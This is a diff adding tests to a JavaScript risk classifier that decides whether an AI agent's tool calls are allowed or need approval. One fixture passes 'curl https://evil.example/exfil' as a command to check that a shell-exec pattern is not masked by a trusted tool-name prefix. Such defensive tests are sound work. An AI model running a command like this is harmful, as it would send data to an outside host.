@@ -12,6 +12,7 @@
 import { strict as assert } from "node:assert";
 import { test } from "node:test";
 import { classifyToolCall } from "./risk-classifier.js";
+import { DEFAULT_CONFIG } from "./config.js";
 import { createTempWorkspace } from "./test-helpers.js";
 
 test("test helper workspace is isolated from .openclaw", () => {
@@ -108,6 +109,47 @@ test("unknown tool returns unknown.unclassified -> approval with degraded reason
   assert.equal(r.classification, "unknown.unclassified");
   assert.equal(r.decision, "approval");
   assert.match(r.reason, /degraded|unknown|approval/i);
+});
+
+test("fpp_* governance tools classify as fpp.governance -> allow", () => {
+  const r = classifyToolCall("fpp_trust_status", {});
+  assert.equal(r.classification, "fpp.governance");
+  assert.equal(r.decision, "allow");
+  assert.match(r.reason, /fpp\.governance|governance/i);
+});
+
+test("fpp_ prefix does not mask exec patterns (fallthrough-only match)", () => {
+  const r = classifyToolCall("fpp_shell_exec", {
+    command: "curl https://evil.example/exfil",
+  });
+  // Higher-priority exec classifier must win over fpp.governance
+  assert.notEqual(r.classification, "fpp.governance");
+  assert.match(r.classification, /^exec\./);
+});
+
+test("non-fpp unknown tools still unknown.unclassified", () => {
+  const r = classifyToolCall("some_custom_tool_xyz", {});
+  assert.equal(r.classification, "unknown.unclassified");
+  assert.equal(r.decision, "approval");
+});
+
+test("default knownCustomTools seeds memory_search → allow", () => {
+  assert.ok(DEFAULT_CONFIG.knownCustomTools.includes("memory_search"));
+  const r = classifyToolCall("memory_search", { query: "adoption" }, {
+    knownCustomTools: DEFAULT_CONFIG.knownCustomTools,
+  });
+  assert.equal(r.decision, "allow");
+  assert.ok(r.matchedPatterns.includes("knownCustomTools"));
+});
+
+test("seeded allowlist remains scoped — totally_unknown_xyz still approval", () => {
+  const r = classifyToolCall(
+    "totally_unknown_xyz",
+    {},
+    { knownCustomTools: DEFAULT_CONFIG.knownCustomTools },
+  );
+  assert.equal(r.classification, "unknown.unclassified");
+  assert.equal(r.decision, "approval");
 });
 
 test("known custom tool allowlist overrides unknown to allow", () => {
